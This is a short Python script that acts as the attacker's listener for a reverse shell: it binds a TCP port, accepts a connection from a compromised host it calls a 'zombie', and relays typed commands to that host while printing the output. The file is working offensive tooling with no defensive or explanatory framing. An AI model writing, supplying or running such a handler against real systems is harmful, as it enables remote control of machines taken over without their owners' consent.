import socket
import threading
import sys 
import time


def listen(host, port):

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.bind((host, port))
	s.listen(100)

	print("\nListening on port " + str(port) + " for connections")

	c, addr = s.accept()

	print("got connection from " + str(addr) + " starting reverse shell session\n")

	control(c)


def control(zombie):

	try:
		while True:	
				
			cmd = zombie.recv(1024).decode()	
			sys.stdout.write(cmd)

			d = input()
			d += "\n"
			zombie.send(d.encode())
			time.sleep(0.1)		#This sleep is required to allow the zombie to finish processing the command


			sys.stdout.write("\033[A"+cmd.split("\n")[-1])		#Removes duplicate command from stdout

	except Exception as e:
		print("Error: " + e)
